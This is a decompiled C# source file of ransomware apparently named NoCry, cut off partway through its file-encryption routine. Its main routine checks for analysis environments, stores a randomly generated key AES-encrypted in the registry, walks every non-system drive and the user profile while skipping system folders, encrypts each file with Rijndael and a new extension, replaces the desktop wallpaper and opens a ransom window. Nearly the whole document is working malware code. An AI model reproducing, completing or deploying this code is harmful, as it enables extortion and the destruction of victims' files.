using System;
using System.Collections;
using System.Collections.Generic;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Linq;
using System.Management;
using System.Net;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using NoCry;

namespace ns0;

[StandardModule]
internal sealed class Class11
{
	private enum Enum1
	{
		const_0 = 1
	}

	private static FileStream fileStream_0;

	private static FileStream fileStream_1;

	private static byte[] byte_0;

	private static byte[] byte_1;

	private static string string_0;

	private static int int_0;

	private static int int_1;

	public static object object_0;

	public static List<string> list_0 = new List<string>();

	public static object object_1 = null;

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int SystemParametersInfoA(int int_2, int int_3, [MarshalAs(UnmanagedType.VBByRefStr)] ref string string_1, int int_4);

	[MethodImpl(MethodImplOptions.NoOptimization)]
	[STAThread]
	public static void Main()
	{
		//IL_0cae: Unknown result type (might be due to invalid IL or missing references)
		int try0001_dispatch = -1;
		int num = default(int);
		bool createdNew = default(bool);
		int num2 = default(int);
		int num3 = default(int);
		int num5 = default(int);
		IEnumerator enumerator = default(IEnumerator);
		IEnumerator enumerator2 = default(IEnumerator);
		string text = default(string);
		StringBuilder stringBuilder = default(StringBuilder);
		Random random = default(Random);
		int int_ = default(int);
		int num6 = default(int);
		string input = default(string);
		int index = default(int);
		char value = default(char);
		string[] logicalDrives = default(string[]);
		int num7 = default(int);
		string text2 = default(string);
		DriveInfo driveInfo = default(DriveInfo);
		string[] directories = default(string[]);
		int num8 = default(int);
		string text3 = default(string);
		string string_ = default(string);
		IEnumerator enumerator3 = default(IEnumerator);
		string text4 = default(string);
		string[] directories2 = default(string[]);
		int num9 = default(int);
		string string_2 = default(string);
		IEnumerator enumerator4 = default(IEnumerator);
		string text5 = default(string);
		IEnumerator enumerator5 = default(IEnumerator);
		IEnumerator enumerator6 = default(IEnumerator);
		string text6 = default(string);
		string text7 = default(string);
		string[] directories3 = default(string[]);
		int num10 = default(int);
		string string_3 = default(string);
		IEnumerator enumerator7 = default(IEnumerator);
		string text8 = default(string);
		List<string>.Enumerator enumerator8 = default(List<string>.Enumerator);
		string current = default(string);
		string[] logicalDrives2 = default(string[]);
		string text9 = default(string);
		DriveInfo driveInfo2 = default(DriveInfo);
		string[] directories4 = default(string[]);
		int num11 = default(int);
		string text10 = default(string);
		IEnumerator enumerator9 = default(IEnumerator);
		string text11 = default(string);
		string text12 = default(string);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				checked
				{
					switch (try0001_dispatch)
					{
					default:
						num = 1;
						createdNew = false;
						goto IL_0006;
					case 4271:
						{
							num2 = num;
							switch ((num3 <= -2) ? 1 : num3)
							{
							case 1:
								break;
							default:
								goto end_IL_0001;
							}
							int num4 = unchecked(num2 + 1);
							num2 = 0;
							switch (num4)
							{
							case 1:
								break;
							case 2:
								goto IL_0006;
							case 3:
								goto IL_001a;
							case 4:
							case 5:
								goto IL_0027;
							case 6:
								goto IL_003e;
							case 7:
							case 8:
							case 9:
								goto IL_004c;
							case 10:
								goto IL_0064;
							case 11:
							case 12:
							case 13:
								goto IL_0073;
							case 14:
								goto IL_008b;
							case 15:
							case 16:
							case 17:
								goto IL_009a;
							case 18:
								goto IL_00b2;
							case 19:
							case 20:
							case 21:
								goto IL_00c1;
							case 22:
								goto IL_00d9;
							case 23:
							case 24:
							case 25:
								goto IL_00e8;
							case 26:
								goto IL_0100;
							case 27:
							case 28:
								goto IL_010e;
							case 29:
								goto IL_0120;
							case 31:
								goto IL_014f;
							case 32:
								goto IL_017a;
							case 33:
								goto IL_0183;
							case 34:
								goto IL_018c;
							case 35:
								goto IL_019b;
							case 36:
								goto IL_01b1;
							case 37:
								goto IL_01c2;
							case 38:
								goto IL_01ce;
							case 39:
								goto IL_01dd;
							case 40:
								goto IL_01e8;
							case 41:
								goto IL_021a;
							case 30:
							case 42:
							case 43:
							case 44:
								goto IL_0272;
							case 46:
								goto IL_02a1;
							case 47:
								goto IL_02aa;
							case 48:
								goto IL_02e9;
							case 49:
								goto IL_0328;
							case 50:
								goto IL_0349;
							case 51:
								goto IL_0355;
							case 53:
								goto IL_0377;
							case 54:
								goto IL_039a;
							case 56:
								goto IL_03ae;
							case 58:
								goto IL_03c2;
							case 60:
								goto IL_03d6;
							case 62:
								goto IL_03ea;
							case 64:
								goto IL_03fe;
							case 66:
								goto IL_0412;
							case 68:
								goto IL_0426;
							case 70:
								goto IL_043a;
							case 72:
								goto IL_044e;
							case 74:
								goto IL_0462;
							case 76:
								goto IL_0476;
							case 77:
								goto IL_04a8;
							case 79:
								goto IL_04b9;
							case 81:
								goto IL_04ca;
							case 83:
								goto IL_04db;
							case 78:
							case 80:
							case 82:
							case 84:
							case 85:
							case 86:
							case 87:
								goto IL_04ea;
							case 88:
								goto IL_04ef;
							case 101:
								goto IL_050f;
							case 102:
								goto IL_0546;
							case 104:
								goto IL_0557;
							case 106:
								goto IL_0568;
							case 108:
								goto IL_0579;
							case 103:
							case 105:
							case 107:
							case 109:
							case 110:
							case 111:
							case 112:
								goto IL_0588;
							case 113:
								goto IL_058d;
							case 52:
							case 114:
							case 115:
								goto IL_05a5;
							case 55:
							case 57:
							case 59:
							case 61:
							case 63:
							case 65:
							case 67:
							case 69:
							case 71:
							case 73:
							case 75:
							case 89:
							case 90:
							case 91:
							case 92:
							case 93:
							case 94:
							case 95:
							case 96:
							case 97:
							case 98:
							case 99:
							case 100:
								goto IL_05b3;
							case 116:
								goto IL_05c1;
							case 117:
								goto IL_05fb;
							case 119:
								goto IL_060c;
							case 121:
								goto IL_061d;
							case 123:
								goto IL_062e;
							case 118:
							case 120:
							case 122:
							case 124:
							case 125:
							case 126:
							case 127:
								goto IL_063d;
							case 128:
								goto IL_0642;
							case 129:
								goto IL_065d;
							case 130:
								goto IL_068b;
							case 131:
								goto IL_06c0;
							case 133:
								goto IL_06d4;
							case 135:
								goto IL_06e8;
							case 137:
								goto IL_06fc;
							case 142:
								goto IL_0710;
							case 143:
								goto IL_072b;
							case 132:
							case 134:
							case 136:
							case 138:
							case 139:
							case 140:
							case 141:
								goto IL_073c;
							case 144:
								goto IL_0747;
							case 145:
								goto IL_076b;
							case 146:
								goto IL_077a;
							case 147:
							case 148:
								goto IL_079e;
							case 149:
								goto IL_07a6;
							case 150:
								goto IL_07b9;
							case 45:
							case 151:
							case 152:
								goto IL_07d3;
							case 153:
								goto IL_07dc;
							case 154:
								goto IL_0800;
							case 155:
								goto IL_080f;
							case 157:
								goto IL_0834;
							case 158:
								goto IL_085a;
							case 160:
								goto IL_0871;
							case 162:
								goto IL_0888;
							case 164:
								goto IL_089f;
							case 166:
								goto IL_08b6;
							case 168:
								goto IL_08cd;
							case 170:
								goto IL_08e4;
							case 172:
								goto IL_08fb;
							case 174:
								goto IL_0912;
							case 176:
								goto IL_0929;
							case 178:
								goto IL_0940;
							case 180:
								goto IL_0957;
							case 181:
								goto IL_0987;
							case 183:
								goto IL_099b;
							case 185:
								goto IL_09af;
							case 182:
							case 184:
							case 186:
							case 187:
							case 188:
								goto IL_09c1;
							case 189:
								goto IL_09c9;
							case 202:
								goto IL_09ec;
							case 203:
								goto IL_0a21;
							case 205:
								goto IL_0a35;
							case 207:
								goto IL_0a49;
							case 204:
							case 206:
							case 208:
							case 209:
							case 210:
								goto IL_0a5b;
							case 211:
								goto IL_0a63;
							case 156:
							case 212:
							case 213:
								goto IL_0a7e;
							case 159:
							case 161:
							case 163:
							case 165:
							case 167:
							case 169:
							case 171:
							case 173:
							case 175:
							case 177:
							case 179:
							case 190:
							case 191:
							case 192:
							case 193:
							case 194:
							case 195:
							case 196:
							case 197:
							case 198:
							case 199:
							case 200:
							case 201:
								goto IL_0a8f;
							case 214:
								goto IL_0aa0;
							case 215:
								goto IL_0ad8;
							case 217:
								goto IL_0aec;
							case 219:
								goto IL_0b00;
							case 216:
							case 218:
							case 220:
							case 221:
							case 222:
								goto IL_0b12;
							case 223:
								goto IL_0b1a;
							case 224:
								goto IL_0b35;
							case 225:
								goto IL_0b63;
							case 226:
								goto IL_0b93;
							case 228:
								goto IL_0ba7;
							case 230:
								goto IL_0bbb;
							case 234:
								goto IL_0bcf;
							case 235:
								goto IL_0bea;
							case 227:
							case 229:
							case 231:
							case 232:
							case 233:
								goto IL_0bfb;
							case 236:
								goto IL_0c06;
							case 237:
								goto IL_0c1e;
							case 238:
							case 239:
								goto IL_0c29;
							case 240:
								goto IL_0c44;
							case 241:
							case 242:
								goto IL_0c4f;
							case 243:
								goto IL_0c66;
							case 245:
								goto IL_0c75;
							case 244:
							case 246:
							case 247:
								goto IL_0c8c;
							case 248:
								goto end_IL_0001_2;
							default:
								goto end_IL_0001;
							case 249:
								goto end_IL_0001_3;
							}
							goto default;
						}
						IL_0c29:
						num = 239;
						if (Operators.CompareString(Class13.string_3, "True", false) == 0)
						{
							goto IL_0c44;
						}
						goto IL_0c4f;
						IL_0a7e:
						num = 213;
						num5++;
						goto IL_07ec;
						IL_0a63:
						num = 211;
						if (enumerator is IDisposable)
						{
							(enumerator as IDisposable).Dispose();
						}
						goto IL_0a7e;
						IL_0aa0:
						num = 214;
						enumerator2 = ((IEnumerable)smethod_3(Interaction.Environ("USERPROFILE"))).GetEnumerator();
						goto IL_0ac1;
						IL_0006:
						num = 2;
						object_1 = new Mutex(initiallyOwned: true, Class13.string_4, out createdNew);
						goto IL_001a;
						IL_001a:
						num = 3;
						if (!createdNew)
						{
							ProjectData.EndApp();
						}
						goto IL_0027;
						IL_0ac1:
						if (enumerator2.MoveNext())
						{
							text = Conversions.ToString(enumerator2.Current);
							goto IL_0ad8;
						}
						goto IL_0b1a;
						IL_0027:
						num = 5;
						if (Operators.CompareString(Class13.string_10, "True", false) == 0)
						{
							goto IL_003e;
						}
						goto IL_004c;
						IL_003e:
						num = 6;
						if (Class8.smethod_0())
						{
							ProjectData.EndApp();
						}
						goto IL_004c;
						IL_0c44:
						num = 240;
						smethod_8();
						goto IL_0c4f;
						IL_004c:
						num = 9;
						if (Operators.CompareString(Class13.string_11, "True", false) == 0)
						{
							goto IL_0064;
						}
						goto IL_0073;
						IL_0064:
						num = 10;
						if (Class8.smethod_2())
						{
							ProjectData.EndApp();
						}
						goto IL_0073;
						IL_0ad8:
						num = 215;
						if (Operators.CompareString(text, (string)null, false) != 0)
						{
							goto IL_0aec;
						}
						goto IL_0b12;
						IL_0073:
						num = 13;
						if (Operators.CompareString(Class13.string_12, "True", false) == 0)
						{
							goto IL_008b;
						}
						goto IL_009a;
						IL_008b:
						num = 14;
						if (Class8.smethod_3())
						{
							ProjectData.EndApp();
						}
						goto IL_009a;
						IL_0aec:
						num = 217;
						if (!Form4.listenc.Contains(text))
						{
							goto IL_0b00;
						}
						goto IL_0b12;
						IL_009a:
						num = 17;
						if (Operators.CompareString(Class13.string_13, "True", false) == 0)
						{
							goto IL_00b2;
						}
						goto IL_00c1;
						IL_00b2:
						num = 18;
						if (Class8.smethod_1())
						{
							ProjectData.EndApp();
						}
						goto IL_00c1;
						IL_0b00:
						num = 219;
						Form4.listenc.Add(text);
						goto IL_0b12;
						IL_00c1:
						num = 21;
						if (Operators.CompareString(Class13.string_14, "True", false) == 0)
						{
							goto IL_00d9;
						}
						goto IL_00e8;
						IL_00d9:
						num = 22;
						if (Class8.smethod_4())
						{
							ProjectData.EndApp();
						}
						goto IL_00e8;
						IL_0b12:
						num = 222;
						goto IL_0ac1;
						IL_00e8:
						num = 25;
						if (Operators.CompareString(Class13.string_2, "True", false) == 0)
						{
							goto IL_0100;
						}
						goto IL_010e;
						IL_0100:
						num = 26;
						smethod_7(Application.get_ExecutablePath());
						goto IL_010e;
						IL_010e:
						num = 28;
						Class13.string_1 = Conversions.ToString(smethod_9());
						goto IL_0120;
						IL_0120:
						num = 29;
						if (Operators.CompareString(Interaction.GetSetting("F", "0", Class13.string_15, ""), "Done", false) != 0)
						{
							goto IL_014f;
						}
						goto IL_0272;
						IL_014f:
						num = 31;
						if (Operators.CompareString(Interaction.GetSetting("F", "0", Class13.string_15, ""), (string)null, false) == 0)
						{
							goto IL_017a;
						}
						goto IL_0272;
						IL_017a:
						num = 32;
						stringBuilder = new StringBuilder();
						goto IL_0183;
						IL_0183:
						num = 33;
						random = new Random();
						goto IL_018c;
						IL_018c:
						num = 34;
						int_ = Class13.int_2;
						num6 = 1;
						goto IL_01d7;
						IL_01d7:
						if (num6 <= int_)
						{
							goto IL_019b;
						}
						goto IL_01dd;
						IL_01dd:
						num = 39;
						input = stringBuilder.ToString();
						goto IL_01e8;
						IL_01e8:
						num = 40;
						Interaction.SaveSetting("F", "0", Class13.string_15, Conversions.ToString(check.AES_Encrypt(input, smethod_11() + smethod_11())));
						goto IL_021a;
						IL_021a:
						num = 41;
						Interaction.SaveSetting("G", "0", Class13.string_15, Conversions.ToString(check.AES_Encrypt(Class13.string_15, Conversions.ToString(check.AES_Decrypttt(Interaction.GetSetting("F", "0", Class13.string_15, ""), smethod_11() + smethod_11())))));
						goto IL_0272;
						IL_019b:
						num = 35;
						index = random.Next(0, Class13.string_17.Length);
						goto IL_01b1;
						IL_01b1:
						num = 36;
						value = Class13.string_17[index];
						goto IL_01c2;
						IL_01c2:
						num = 37;
						stringBuilder.Append(value);
						goto IL_01ce;
						IL_01ce:
						num = 38;
						num6++;
						goto IL_01d7;
						IL_0272:
						num = 44;
						if (Operators.CompareString(Interaction.GetSetting("C", "0", Class13.string_15, ""), "Done", false) != 0)
						{
							goto IL_02a1;
						}
						goto IL_07d3;
						IL_02a1:
						ProjectData.ClearProjectError();
						num3 = -2;
						goto IL_02aa;
						IL_02aa:
						num = 47;
						byte_0 = smethod_5(Conversions.ToString(check.AES_Decrypttt(Interaction.GetSetting("F", "0", Class13.string_15, ""), smethod_11() + smethod_11())));
						goto IL_02e9;
						IL_02e9:
						num = 48;
						byte_1 = smethod_6(Conversions.ToString(check.AES_Decrypttt(Interaction.GetSetting("F", "0", Class13.string_15, ""), smethod_11() + smethod_11())));
						goto IL_0328;
						IL_0328:
						num = 49;
						logicalDrives = Environment.GetLogicalDrives();
						num7 = 0;
						goto IL_0335;
						IL_0335:
						if (num7 < logicalDrives.Length)
						{
							text2 = logicalDrives[num7];
							goto IL_0349;
						}
						goto IL_05c1;
						IL_0b1a:
						num = 223;
						if (enumerator2 is IDisposable)
						{
							(enumerator2 as IDisposable).Dispose();
						}
						goto IL_0b35;
						IL_0349:
						num = 50;
						driveInfo = new DriveInfo(text2);
						goto IL_0355;
						IL_0355:
						num = 51;
						if (Operators.CompareString(driveInfo.Name, Path.GetPathRoot(Environment.SystemDirectory), false) != 0)
						{
							goto IL_0377;
						}
						goto IL_05a5;
						IL_0377:
						num = 53;
						directories = Directory.GetDirectories(text2);
						num8 = 0;
						goto IL_0386;
						IL_0386:
						if (num8 < directories.Length)
						{
							text3 = directories[num8];
							goto IL_039a;
						}
						goto IL_050f;
						IL_0c4f:
						num = 242;
						string_ = Path.GetTempPath() + "Cry.img";
						goto IL_0c66;
						IL_039a:
						num = 54;
						if (!text3.EndsWith("Bin"))
						{
							goto IL_03ae;
						}
						goto IL_05b3;
						IL_03ae:
						num = 56;
						if (!text3.EndsWith("indows"))
						{
							goto IL_03c2;
						}
						goto IL_05b3;
						IL_03c2:
						num = 58;
						if (!text3.EndsWith("tings"))
						{
							goto IL_03d6;
						}
						goto IL_05b3;
						IL_03d6:
						num = 60;
						if (!text3.EndsWith("System Volume Information"))
						{
							goto IL_03ea;
						}
						goto IL_05b3;
						IL_03ea:
						num = 62;
						if (!text3.EndsWith("cache"))
						{
							goto IL_03fe;
						}
						goto IL_05b3;
						IL_03fe:
						num = 64;
						if (!text3.EndsWith("very"))
						{
							goto IL_0412;
						}
						goto IL_05b3;
						IL_0412:
						num = 66;
						if (!text3.EndsWith("rogram Files (x86)"))
						{
							goto IL_0426;
						}
						goto IL_05b3;
						IL_0426:
						num = 68;
						if (!text3.EndsWith("rogram Files"))
						{
							goto IL_043a;
						}
						goto IL_05b3;
						IL_043a:
						num = 70;
						if (!text3.EndsWith("boot"))
						{
							goto IL_044e;
						}
						goto IL_05b3;
						IL_044e:
						num = 72;
						if (!text3.EndsWith("efi"))
						{
							goto IL_0462;
						}
						goto IL_05b3;
						IL_0462:
						num = 74;
						if (!text3.EndsWith(".old"))
						{
							goto IL_0476;
						}
						goto IL_05b3;
						IL_0476:
						num = 76;
						enumerator3 = ((IEnumerable)smethod_0(text3, ".*")).GetEnumerator();
						goto IL_0491;
						IL_0491:
						if (enumerator3.MoveNext())
						{
							text4 = Conversions.ToString(enumerator3.Current);
							goto IL_04a8;
						}
						goto IL_04ef;
						IL_0b35:
						num = 224;
						directories2 = Directory.GetDirectories(Interaction.Environ("USERPROFILE"));
						num9 = 0;
						goto IL_0b4f;
						IL_04a8:
						num = 77;
						if (Operators.CompareString(text4, (string)null, false) != 0)
						{
							goto IL_04b9;
						}
						goto IL_04ea;
						IL_04b9:
						num = 79;
						if (!list_0.Contains(text4))
						{
							goto IL_04ca;
						}
						goto IL_04ea;
						IL_04ca:
						num = 81;
						if (!text4.EndsWith(Class13.string_5))
						{
							goto IL_04db;
						}
						goto IL_04ea;
						IL_04db:
						num = 83;
						list_0.Add(text4);
						goto IL_04ea;
						IL_04ea:
						num = 87;
						goto IL_0491;
						IL_04ef:
						num = 88;
						if (enumerator3 is IDisposable)
						{
							(enumerator3 as IDisposable).Dispose();
						}
						goto IL_05b3;
						IL_0b4f:
						if (num9 < directories2.Length)
						{
							string_2 = directories2[num9];
							goto IL_0b63;
						}
						goto IL_0c06;
						IL_05b3:
						num = 100;
						num8++;
						goto IL_0386;
						IL_050f:
						num = 101;
						enumerator4 = ((IEnumerable)smethod_1(driveInfo.Name, ".*")).GetEnumerator();
						goto IL_052f;
						IL_052f:
						if (enumerator4.MoveNext())
						{
							text5 = Conversions.ToString(enumerator4.Current);
							goto IL_0546;
						}
						goto IL_058d;
						IL_0c66:
						num = 243;
						if (!File.Exists(string_))
						{
							goto IL_0c75;
						}
						goto IL_0c8c;
						IL_0546:
						num = 102;
						if (Operators.CompareString(text5, (string)null, false) != 0)
						{
							goto IL_0557;
						}
						goto IL_0588;
						IL_0557:
						num = 104;
						if (!list_0.Contains(text5))
						{
							goto IL_0568;
						}
						goto IL_0588;
						IL_0568:
						num = 106;
						if (!text5.EndsWith(Class13.string_5))
						{
							goto IL_0579;
						}
						goto IL_0588;
						IL_0579:
						num = 108;
						list_0.Add(text5);
						goto IL_0588;
						IL_0588:
						num = 112;
						goto IL_052f;
						IL_058d:
						num = 113;
						if (enumerator4 is IDisposable)
						{
							(enumerator4 as IDisposable).Dispose();
						}
						goto IL_05a5;
						IL_0b63:
						num = 225;
						enumerator5 = ((IEnumerable)smethod_2(string_2)).GetEnumerator();
						goto IL_0b7c;
						IL_05a5:
						num = 115;
						num7++;
						goto IL_0335;
						IL_05c1:
						num = 116;
						enumerator6 = ((IEnumerable)smethod_1(Interaction.Environ("USERPROFILE"), ".*")).GetEnumerator();
						goto IL_05e4;
						IL_05e4:
						if (enumerator6.MoveNext())
						{
							text6 = Conversions.ToString(enumerator6.Current);
							goto IL_05fb;
						}
						goto IL_0642;
						IL_0b7c:
						if (enumerator5.MoveNext())
						{
							text7 = Conversions.ToString(enumerator5.Current);
							goto IL_0b93;
						}
						goto IL_0bcf;
						IL_05fb:
						num = 117;
						if (Operators.CompareString(text6, (string)null, false) != 0)
						{
							goto IL_060c;
						}
						goto IL_063d;
						IL_060c:
						num = 119;
						if (!list_0.Contains(text6))
						{
							goto IL_061d;
						}
						goto IL_063d;
						IL_061d:
						num = 121;
						if (!text6.EndsWith(Class13.string_5))
						{
							goto IL_062e;
						}
						goto IL_063d;
						IL_062e:
						num = 123;
						list_0.Add(text6);
						goto IL_063d;
						IL_063d:
						num = 127;
						goto IL_05e4;
						IL_0642:
						num = 128;
						if (enumerator6 is IDisposable)
						{
							(enumerator6 as IDisposable).Dispose();
						}
						goto IL_065d;
						IL_0c75:
						num = 245;
						((Image)Class6.background).Save(string_, ImageFormat.get_Bmp());
						goto IL_0c8c;
						IL_065d:
						num = 129;
						directories3 = Directory.GetDirectories(Interaction.Environ("USERPROFILE"));
						num10 = 0;
						goto IL_0677;
						IL_0677:
						if (num10 < directories3.Length)
						{
							string_3 = directories3[num10];
							goto IL_068b;
						}
						goto IL_0747;
						IL_0b93:
						num = 226;
						if (Operators.CompareString(text7, (string)null, false) != 0)
						{
							goto IL_0ba7;
						}
						goto IL_0bfb;
						IL_068b:
						num = 130;
						enumerator7 = ((IEnumerable)smethod_0(string_3, ".*")).GetEnumerator();
						goto IL_06a9;
						IL_06a9:
						if (enumerator7.MoveNext())
						{
							text8 = Conversions.ToString(enumerator7.Current);
							goto IL_06c0;
						}
						goto IL_0710;
						IL_0ba7:
						num = 228;
						if (!Form4.listenc.Contains(text7))
						{
							goto IL_0bbb;
						}
						goto IL_0bfb;
						IL_06c0:
						num = 131;
						if (Operators.CompareString(text8, (string)null, false) != 0)
						{
							goto IL_06d4;
						}
						goto IL_073c;
						IL_06d4:
						num = 133;
						if (!list_0.Contains(text8))
						{
							goto IL_06e8;
						}
						goto IL_073c;
						IL_06e8:
						num = 135;
						if (!text8.EndsWith(Class13.string_5))
						{
							goto IL_06fc;
						}
						goto IL_073c;
						IL_06fc:
						num = 137;
						list_0.Add(text8);
						goto IL_073c;
						IL_073c:
						num = 141;
						goto IL_06a9;
						IL_0710:
						num = 142;
						if (enumerator7 is IDisposable)
						{
							(enumerator7 as IDisposable).Dispose();
						}
						goto IL_072b;
						IL_0bbb:
						num = 230;
						Form4.listenc.Add(text7);
						goto IL_0bfb;
						IL_072b:
						num = 143;
						num10++;
						goto IL_0677;
						IL_0747:
						num = 144;
						enumerator8 = list_0.GetEnumerator();
						goto IL_0759;
						IL_0759:
						if (enumerator8.MoveNext())
						{
							current = enumerator8.Current;
							goto IL_076b;
						}
						goto IL_07a6;
						IL_0bfb:
						num = 233;
						goto IL_0b7c;
						IL_076b:
						num = 145;
						if (File.Exists(current))
						{
							goto IL_077a;
						}
						goto IL_079e;
						IL_077a:
						num = 146;
						smethod_4(current, current + Class13.string_5, byte_0, byte_1, Enum1.const_0);
						goto IL_079e;
						IL_079e:
						num = 148;
						goto IL_0759;
						IL_07a6:
						num = 149;
						((IDisposable)enumerator8).Dispose();
						goto IL_07b9;
						IL_07b9:
						num = 150;
						Class2.Class3_0.Form1_0.BackgroundWorker1.RunWorkerAsync();
						goto IL_07d3;
						IL_07d3:
						ProjectData.ClearProjectError();
						num3 = -3;
						goto IL_07dc;
						IL_07dc:
						num = 153;
						logicalDrives2 = Environment.GetLogicalDrives();
						num5 = 0;
						goto IL_07ec;
						IL_07ec:
						if (num5 < logicalDrives2.Length)
						{
							text9 = logicalDrives2[num5];
							goto IL_0800;
						}
						goto IL_0aa0;
						IL_0bcf:
						num = 234;
						if (enumerator5 is IDisposable)
						{
							(enumerator5 as IDisposable).Dispose();
						}
						goto IL_0bea;
						IL_0800:
						num = 154;
						driveInfo2 = new DriveInfo(text9);
						goto IL_080f;
						IL_080f:
						num = 155;
						if (Operators.CompareString(driveInfo2.Name, Path.GetPathRoot(Environment.SystemDirectory), false) != 0)
						{
							goto IL_0834;
						}
						goto IL_0a7e;
						IL_0834:
						num = 157;
						directories4 = Directory.GetDirectories(text9);
						num11 = 0;
						goto IL_0846;
						IL_0846:
						if (num11 < directories4.Length)
						{
							text10 = directories4[num11];
							goto IL_085a;
						}
						goto IL_09ec;
						IL_0c8c:
						num = 247;
						SystemParametersInfoA(20, 0, ref string_, 1);
						break;
						IL_085a:
						num = 158;
						if (!text10.EndsWith("Bin"))
						{
							goto IL_0871;
						}
						goto IL_0a8f;
						IL_0871:
						num = 160;
						if (!text10.EndsWith("indows"))
						{
							goto IL_0888;
						}
						goto IL_0a8f;
						IL_0888:
						num = 162;
						if (!text10.EndsWith("tings"))
						{
							goto IL_089f;
						}
						goto IL_0a8f;
						IL_089f:
						num = 164;
						if (!text10.EndsWith("System Volume Information"))
						{
							goto IL_08b6;
						}
						goto IL_0a8f;
						IL_08b6:
						num = 166;
						if (!text10.EndsWith("cache"))
						{
							goto IL_08cd;
						}
						goto IL_0a8f;
						IL_08cd:
						num = 168;
						if (!text10.EndsWith("very"))
						{
							goto IL_08e4;
						}
						goto IL_0a8f;
						IL_08e4:
						num = 170;
						if (!text10.EndsWith("rogram Files (x86)"))
						{
							goto IL_08fb;
						}
						goto IL_0a8f;
						IL_08fb:
						num = 172;
						if (!text10.EndsWith("rogram Files"))
						{
							goto IL_0912;
						}
						goto IL_0a8f;
						IL_0912:
						num = 174;
						if (!text10.EndsWith("boot"))
						{
							goto IL_0929;
						}
						goto IL_0a8f;
						IL_0929:
						num = 176;
						if (!text10.EndsWith("efi"))
						{
							goto IL_0940;
						}
						goto IL_0a8f;
						IL_0940:
						num = 178;
						if (!text10.EndsWith(".old"))
						{
							goto IL_0957;
						}
						goto IL_0a8f;
						IL_0957:
						num = 180;
						enumerator9 = ((IEnumerable)smethod_2(text10)).GetEnumerator();
						goto IL_0970;
						IL_0970:
						if (enumerator9.MoveNext())
						{
							text11 = Conversions.ToString(enumerator9.Current);
							goto IL_0987;
						}
						goto IL_09c9;
						IL_0bea:
						num = 235;
						num9++;
						goto IL_0b4f;
						IL_0987:
						num = 181;
						if (Operators.CompareString(text11, (string)null, false) != 0)
						{
							goto IL_099b;
						}
						goto IL_09c1;
						IL_099b:
						num = 183;
						if (!Form4.listenc.Contains(text11))
						{
							goto IL_09af;
						}
						goto IL_09c1;
						IL_09af:
						num = 185;
						Form4.listenc.Add(text11);
						goto IL_09c1;
						IL_09c1:
						num = 188;
						goto IL_0970;
						IL_09c9:
						num = 189;
						if (enumerator9 is IDisposable)
						{
							(enumerator9 as IDisposable).Dispose();
						}
						goto IL_0a8f;
						IL_0c06:
						num = 236;
						if (Operators.ConditionalCompareObjectEqual(Class13.object_0, (object)"OK", false))
						{
							goto IL_0c1e;
						}
						goto IL_0c29;
						IL_0a8f:
						num = 201;
						num11++;
						goto IL_0846;
						IL_09ec:
						num = 202;
						enumerator = ((IEnumerable)smethod_3(driveInfo2.Name)).GetEnumerator();
						goto IL_0a0a;
						IL_0a0a:
						if (enumerator.MoveNext())
						{
							text12 = Conversions.ToString(enumerator.Current);
							goto IL_0a21;
						}
						goto IL_0a63;
						IL_0c1e:
						num = 237;
						Class9.smethod_0();
						goto IL_0c29;
						IL_0a21:
						num = 203;
						if (Operators.CompareString(text12, (string)null, false) != 0)
						{
							goto IL_0a35;
						}
						goto IL_0a5b;
						IL_0a35:
						num = 205;
						if (!Form4.listenc.Contains(text12))
						{
							goto IL_0a49;
						}
						goto IL_0a5b;
						IL_0a49:
						num = 207;
						Form4.listenc.Add(text12);
						goto IL_0a5b;
						IL_0a5b:
						num = 210;
						goto IL_0a0a;
						end_IL_0001_2:
						break;
					}
					num = 248;
					((Form)Class2.Class3_0.Form1_0).ShowDialog();
					break;
				}
				end_IL_0001:;
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0001_dispatch = 4271;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0001_3:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	public static object smethod_0(string string_1, string string_2)
	{
		return from string_0 in Directory.GetFiles(string_1, "*" + string_2, SearchOption.AllDirectories)
			select (string_0);
	}

	public static object smethod_1(string string_1, string string_2)
	{
		return from string_0 in Directory.GetFiles(string_1, "*" + string_2)
			select (string_0);
	}

	public static object smethod_2(string string_1)
	{
		return from string_0 in Directory.GetFiles(string_1, "*" + Class13.string_5, SearchOption.AllDirectories)
			select (string_0);
	}

	public static object smethod_3(string string_1)
	{
		return from string_0 in Directory.GetFiles(string_1, "*" + Class13.string_5)
			select (string_0);
	}

	private static void smethod_4(string string_1, string string_2, byte[] byte_2, byte[] byte_3, Enum1 enum1_0)
	{
		int try0001_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		int num5 = default(int);
		byte[] buffer = default(byte[]);
		CryptoStream cryptoStream = default(CryptoStream);
		FileInfo fileInfo = default(FileInfo);
		long num6 = default(long);
		long length = default(long);
		RijndaelManaged rijndaelManaged = default(RijndaelManaged);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0001_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = -2;
					goto IL_000a;
				case 385:
					{
						num2 = num;
						switch ((num3 <= -2) ? 1 : num3)
						{
						case 1:
							break;
						default:
							goto end_IL_0001;
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_000a;
						case 3:
							goto IL_0019;
						case 4:
							goto IL_0028;
						case 5:
							goto IL_0036;
						case 6:
							goto IL_0043;
						case 7:
							goto IL_0048;
						case 8:
							goto IL_0056;
						case 9:
							goto IL_005f;
						case 11:
							goto IL_006d;
						case 15:
							goto IL_0088;
						case 16:
							goto IL_009e;
						case 17:
							goto IL_00ac;
						case 10:
						case 12:
						case 13:
						case 14:
						case 18:
							goto IL_00b5;
						case 19:
							goto IL_00bf;
						case 20:
							goto IL_00c9;
						case 21:
							goto IL_00d6;
						case 22:
							goto IL_00e3;
						case 23:
							goto IL_00ed;
						case 24:
							goto end_IL_0001_2;
						default:
